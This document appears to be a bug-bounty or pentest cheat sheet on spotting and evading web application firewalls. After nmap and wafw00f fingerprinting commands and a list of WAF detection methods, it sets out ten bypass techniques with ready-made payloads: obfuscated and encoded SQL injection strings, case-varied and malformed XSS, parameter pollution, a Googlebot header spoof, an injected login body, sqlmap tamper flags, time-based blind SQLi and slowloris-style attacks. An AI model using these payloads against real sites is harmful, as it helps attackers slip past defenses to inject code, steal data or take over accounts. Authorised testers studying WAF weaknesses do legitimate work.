
##### Identify waf technology:
```bash
sudo nmap bugcrowd.com -p80,443 --script=http-waf-fingerprint -v
sudo nmap bugcrowd.com -p80,443 --script=http-waf-detect -v
wafw00f hackerone.com
```

Common WAF Detection Methods: 

```bash
# Modern WAFs use rule-based filtering, signature matching, machine learning models #and behavior analysis. Popular WAF providers include Cloudflare, Akamai, AWS WAF, #Imperva and F5.

✅ Signature-Based Detection — Blocks known attack patterns (e.g., UNION SELECT, <script>)

✅ Rate Limiting – Blocks too many requests from the same IP 

✅ Input Sanitization – Removes special characters from user input 

✅ Behavioral Analysis – Detects patterns in traffic and blocks suspicious behavior

✅ GeoIP & ASN Filtering
	Blocks IPs based on country or ASN (cloud provider).
	Example: blocks requests from AWS, GCP, DigitalOcean.
	
✅ Header Inspection
    Blocks requests with missing or spoofed headers:
        User-Agent
        Referer
        X-Requested-With
        
✅ Keyword Obfuscation Detection
    Detects attacks even with obfuscated payloads:
        U%4eION%20SE%4cECT
        String.fromCharCode(97,108,101,114,116)
        
✅ Protocol/Method Filtering
    Blocks:
        Specific HTTP methods (e.g., PUT, TRACE, OPTIONS)
        Large or malformed requests
        
✅ Cookie & CSRF Token Enforcement:
    Requires valid session tokens or anti-CSRF tokens.
    Blocks or redirects if missing/invalid.
    
✅ Referrer & Origin Checking
    Blocks external requests without proper Referer or Origin headers.
    Common in WAFs protecting admin panels or APIs.
    
✅ ML-Based Detection — 
	Newer WAFs now use trained models to detect obfuscated payloads

✅ Heuristics & Behavior — 
	Blocking based on behavioral patterns (e.g., timing, repetition)


✅ Custom Rules (ModSecurity / NAXSI / AWS WAF)
    Self-defined rulesets like:
        Block eval( in any input
        Allow POST only to /submit

#Modern, WAFs are more integrated with:

#Threat intelligence feeds
#Real-time learning models
#Bot detection engines
```

```bash
🧪 WAF Detection Tips (as an attacker or tester):
     Do curl or ffuf requests fail but browsers work? → Header/JS check
     Do aggressive scans get blocked after N requests? → Rate limiting
     Are cloud IPs blocked but home IP works? → Geo/ASN filter
     Does the site issue JS-based redirects? → Challenge verification
     Is 403 returned on POST to /login with missing CSRF? → Token enforcement
```


##### WAF Bypass Techniques :

Technique #1: Payload Obfuscation
- Used encoding and double encoding
- Used various type of encoding like base64 , url encoding , or more
- String Splitting ,String Concatenation:
```bash
#example payload
SEL/**/ECT * FROM users --
UNION → 'UNI'+'ON'

SELECT%u0020*%u0020FROM%u0020users%u0020WHERE%u0020id=1
 ' OR 1=1 --'
 %27%20OR%201%3D1%20--

#Base64 encode payloads
#Use JSON or XML-based requests instead of URL parameters
#Use multipart/form-data to deliver payloads hidden in file uploads or fields
```


Technique #2: HTTP Parameter Pollution (HPP)
-  Duplicating parameters in the request to confuse the WAF.
```bash
GET /search?query=<script>alert(1)</script>             #blocked 
GET /search?query=<script>&query=alert(1)</script>#bypassed 
?id=1&id=2
```


Technique #3: Header Manipulation
- Most WAFs block attacks based on request headers, but some rely only on specific headers like User-Agent and Referrer.
```bash
#blocked
GET /admin-panel HTTP/1.1
User-Agent: Mozilla/5.0 (hacker-tool)

#allowed
GET /admin-panel HTTP/1.1
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)

#example of headers.
X-Forwarded-For, X-Originating-IP, or User-Agent

curl --header "Host: target.com" http://IP-ADDRESS
Try IPv6 if the website has IPv6 enabled.

```


 Technique #4: Case Manipulation (WAF Case Sensitivity Bypass)
 - Some WAFs only block lowercase attack keywords but ignore uppercase variations.
```bash
#blocked 
GET /search?q=<script>alert(1)</script>

#case variation allowed
GET /search?q=<ScRiPt>alert(1)</ScRiPt>
```

 
 Technique #5: Change the method
 - WAF was only filtering GET requests, but POST requests were not being sanitized.
```bash
 POST /api/v1/admin-login
Content-Type: application/json

{"username": "admin", "password": "' OR '1'='1' --"}
```


 Technique #6: Tamper Scripts(SQLMAP)
 ```bash
 --tamper=between,randomcase,charunicodeencode,space2comment
```


Technique #7: Payload Wrapping
```bash
UN/**/ION/**/SELECT #Wrap payloads in SQL or HTML comments:

<scr<script>ipt>alert(1)</script> #malformed script
```

Technique #8 : Low and Slow Attacks
- Use tools like slowloris or slowhttptest
- Send payloads byte-by-byte with delays to avoid detection

Technique #9 : Time-Based Triggering
- Use timing payloads (especially for blind SQLi):
```bash
IF(1=1, SLEEP(5), 0)
```

Technique #10 : Second-Order Attacks
- Store payloads in one location that gets executed in another (e.g., admin panel)
- WAFs may miss these since the injection isn’t directly executed
